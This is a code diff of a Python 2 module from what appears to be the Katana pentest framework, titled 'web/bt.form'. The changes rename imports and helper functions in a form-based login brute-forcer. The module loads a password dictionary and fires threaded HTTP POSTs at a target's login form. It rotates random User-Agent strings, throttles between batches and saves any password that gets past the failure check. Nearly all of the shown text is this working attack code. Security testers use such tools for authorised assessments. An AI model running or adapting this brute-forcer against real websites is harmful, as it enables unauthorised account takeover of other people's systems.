@@ -3,11 +3,10 @@
 
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
 # Katana Core import                  #
-from core.KATANAFRAMEWORK import *    #
+from core.KatanaFramework import *    #
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
 
 # LIBRARIES  
-from core.Function import isLive,RamdonAgent,saveRegister
 import httplib,urllib,threading,time
 # END LIBRARIES 
 
@@ -18,7 +17,7 @@ def init():
 	init.Description        ="Brute Force to Form-based in Webs application."
 	init.CodeName           ="web/bt.form"
 	init.DateCreation       ="28/02/2015"      
-	init.LastModification   ="26/05/2016"
+	init.LastModification   ="25/12/2016"
 	init.References         =None
 	init.License            =KTF_LINCENSE
 	init.var                ={}
@@ -47,7 +46,7 @@ def init():
 # CODE MODULE    ############################################################################################
 def main(run):
 
-	isLive(init.var['target'],init.var['port'])
+	NET.CheckConnectionHost(init.var['target'],init.var['port'],5)
 	Loadingfile(init.var['dict'])
 
 	PASSWORDS_REC = []
@@ -70,25 +69,23 @@ def main(run):
 				time.sleep(int(init.var['sleep']))
 				PASSWORDS_REC = []
 
-	printAlert(4," No Result :c\n")
-
 def request_thread(password):
 	#@password : Password for Test in Service.
 
 	global STATE
 	params = urllib.urlencode({init.var['data_a']: init.var['user'], init.var['data_b']: password})
-	header={"Content-type": "application/x-www-form-urlencoded","Accept": "text/plain" , "User-agent" : RamdonAgent()}
+	header={"Content-type": "application/x-www-form-urlencoded","Accept": "text/plain" , "User-agent" : WEB.RamdonAgent()}
 	conn = httplib.HTTPConnection(init.var['target'],init.var['port'])
 	conn.request(init.var['method'], init.var['file'], params, header)
 	response = conn.getresponse()
 	ver_source = response.read()
 
 	if ver_source.find(init.var['alert']) != 0 and response.status == 200:
-		printAlert(3,"Successfully with ["+init.var['data_a']+"="+init.var['user']+"]["+init.var['data_b']+"="+password+"]\n")
-		saveRegister(init,password)
+		printk.suff("Successfully with ["+init.var['data_a']+"="+init.var['user']+"]["+init.var['data_b']+"="+password+"]\n")
+		UTIL.sRegister(init,password)
 		STATE = True
 		return True
 	else:
-		if STATE==False:printAlert(0," | Checking '"+password+"'")
+		if STATE==False:printk.inf(" | Checking '"+password+"'")
 
 # END CODE MODULE ############################################################################################
